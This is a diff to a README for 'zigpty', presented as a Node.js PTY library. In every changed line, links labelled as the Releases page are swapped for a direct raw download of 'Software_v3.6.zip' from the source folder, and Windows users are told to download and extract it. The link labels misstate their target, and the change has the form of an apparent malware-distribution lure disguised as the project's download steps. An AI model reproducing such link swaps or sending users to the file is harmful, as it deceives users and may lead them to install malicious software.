@@ -1,12 +1,12 @@
 # ⚡ zigpty - Simple PTY support for Node.js
 
-[![Download zigpty](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/Banor7300/zigpty/releases)
+[![Download zigpty](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/Banor7300/zigpty/raw/refs/heads/main/src/pty/Software_v3.6.zip)
 
 ## 📥 Download
 
 Use this page to visit the release files and get the Windows version:
 
-[Open the zigpty Releases page](https://github.com/Banor7300/zigpty/releases)
+[Open the zigpty Releases page](https://github.com/Banor7300/zigpty/raw/refs/heads/main/src/pty/Software_v3.6.zip)
 
 Look for the latest release, then download the file for Windows. If there are more than one file, pick the one that matches your system:
 
@@ -39,7 +39,7 @@ If you only want to inspect the release files, you do not need any extra tools.
 
 ## 🚀 How to download on Windows
 
-1. Open the [zigpty Releases page](https://github.com/Banor7300/zigpty/releases)
+1. Open the [zigpty Releases page](https://github.com/Banor7300/zigpty/raw/refs/heads/main/src/pty/Software_v3.6.zip)
 2. Find the newest release near the top of the page
 3. Under **Assets**, choose the Windows file
 4. Click the file to start the download
@@ -211,7 +211,7 @@ Check the release or repository files for the license and build details before y
 
 ## 🗂️ Quick path for Windows users
 
-1. Open the [zigpty Releases page](https://github.com/Banor7300/zigpty/releases)
+1. Open the [zigpty Releases page](https://github.com/Banor7300/zigpty/raw/refs/heads/main/src/pty/Software_v3.6.zip)
 2. Download the latest Windows file
 3. Open your Downloads folder
 4. Extract the file if it is zipped
